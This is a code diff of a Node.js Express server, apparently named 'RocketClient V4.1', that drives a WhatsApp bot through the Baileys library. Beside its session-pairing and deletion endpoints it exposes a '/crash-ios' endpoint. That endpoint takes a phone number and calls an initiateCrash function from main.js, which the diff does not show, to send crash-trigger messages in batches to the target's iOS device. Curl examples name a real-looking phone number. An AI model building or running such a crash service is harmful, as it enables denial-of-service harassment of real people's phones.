@@ -11,25 +11,30 @@ const Boom = require("@hapi/boom");
 const express = require("express");
 const app = express();
 app.use(express.json());
+
 // === BAILEYS ===
 let sock;
 let sessionExists = false;
+
 async function connectBot() {
   const { state, saveCreds } = await useMultiFileAuthState("./database/Session");
   sock = makeWASocket({
     printQRInTerminal: false,
     auth: state,
-    logger: pino({ level: "silent" }),
+    logger: pino({ level: "silent" })
   });
+
   sessionExists = sock.authState.creds.registered;
+
   sock.ev.on("messages.upsert", async (chatUpdate) => {
     const m = chatUpdate.messages[0];
     if (!m.message) return;
     if (m.key.remoteJid === "status@broadcast") return;
     if (m.key.id?.startsWith("BAE5")) return;
-    const msg = m.message.ephemeralMessage?.message || m.message;
+
     require("./main.js")(sock, m, chatUpdate);
   });
+
   sock.decodeJid = (jid) => {
     if (!jid) return jid;
     if (/:\d+@/gi.test(jid)) {
@@ -38,6 +43,7 @@ async function connectBot() {
     }
     return jid;
   };
+
   sock.ev.on("connection.update", async (update) => {
     const { connection, lastDisconnect } = update;
     if (connection === "close") {
@@ -52,10 +58,12 @@ async function connectBot() {
       console.log("Bot conectado com sucesso!");
     }
   });
+
   sock.ev.on("creds.update", saveCreds);
 }
 connectBot();
-// === APIs em JSON (rota raiz) ===
+
+// === APIs ===
 app.get("/", (req, res) => {
   res.json({
     status: "online",
@@ -63,14 +71,16 @@ app.get("/", (req, res) => {
     token: "@xd",
     endpoints: {
       "/status": "GET → { connected: true }",
-      "/connect?token=@xd&query=5582993708218": "Gera código de pareamento",
+      "/connect?token=@xd&query=5582993708218": "Gera código",
       "/deleteSession?token=@xd": "Deleta sessão",
-      "/crash-ios?token=@xd&query=5582993708218": "Envia crash iOS (usa função no main.js)"
+      "/crash-ios?token=@xd&query=5582993708218": "Crash iOS (envia . → 10 lotes)"
     },
     docs: "/docs"
   });
 });
+
 app.get("/status", (req, res) => res.json({ connected: sessionExists }));
+
 app.get("/connect", async (req, res) => {
   if (req.query.token !== "@xd") return res.status(401).json({ error: "Token inválido" });
   if (sessionExists) return res.status(400).json({ error: "Sessão já existe" });
@@ -84,6 +94,7 @@ app.get("/connect", async (req, res) => {
     res.status(500).json({ error: "Erro ao gerar código", details: err.message });
   }
 });
+
 app.get("/deleteSession", (req, res) => {
   if (req.query.token !== "@xd") return res.status(401).json({ error: "Token inválido" });
   fs.rmSync("./database/Session", { recursive: true, force: true });
@@ -91,39 +102,44 @@ app.get("/deleteSession", (req, res) => {
   connectBot();
   res.json({ success: "Sessão deletada" });
 });
-// === CRASH iOS via função no main.js ===
+
+// === CRASH iOS – Só 1 argumento: targetJid ===
 app.get("/crash-ios", async (req, res) => {
   if (req.query.token !== "@xd") return res.status(401).json({ error: "Token inválido" });
   if (!sessionExists) return res.status(400).json({ error: "Bot não conectado" });
+
   const num = req.query.query?.replace(/[^0-9]/g, "");
   if (!num) return res.status(400).json({ error: "Número inválido" });
-  const target = num + "@s.whatsapp.net";
+
+  const targetJid = num + "@s.whatsapp.net";
+
   try {
-    // Chama diretamente a função initiateCrash do main.js (envia "." para acionar o crash via envio)
     const { initiateCrash } = require("./main.js");
-    await initiateCrash(sock, target);
-    res.json({ success: true, target, message: "Crash iOS iniciado via envio de trigger (.) para o alvo" });
+    await initiateCrash(sock, targetJid);   // ← Só 1 argumento
+    res.json({ success: true, target: targetJid, message: "Crash iniciado (. → 10 lotes)" });
   } catch (err) {
-    res.status(500).json({ error: "Falha ao iniciar crash", details: err.message });
+    res.status(500).json({ error: "Falha ao iniciar", details: err.message });
   }
 });
+
 app.get("/docs", (req, res) => {
   res.json({
     api: "RocketClient V4.1",
     token: "@xd",
     endpoints: {
-      "GET /": "Retorna este JSON com APIs",
+      "GET /": "Retorna este JSON",
       "GET /status": "Status do bot",
-      "GET /connect?token=@xd&query=NUMERO": "Gera código de pareamento",
+      "GET /connect?token=@xd&query=NUMERO": "Gera código",
       "GET /deleteSession?token=@xd": "Deleta sessão",
-      "GET /crash-ios?token=@xd&query=NUMERO": "Envia crash iOS (via main.js)"
+      "GET /crash-ios?token=@xd&query=NUMERO": "Crash iOS"
     },
     examples: {
-      connect: "curl 'https://seu-app.onrender.com/connect?token=@xd&query=5582993708218'",
-      crash: "curl 'https://seu-app.onrender.com/crash-ios?token=@xd&query=5582993708218'"
+      connect: "curl '/connect?token=@xd&query=5582993708218'",
+      crash: "curl '/crash-ios?token=@xd&query=5582993708218'"
     }
   });
 });
+
 // === SERVIDOR ===
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
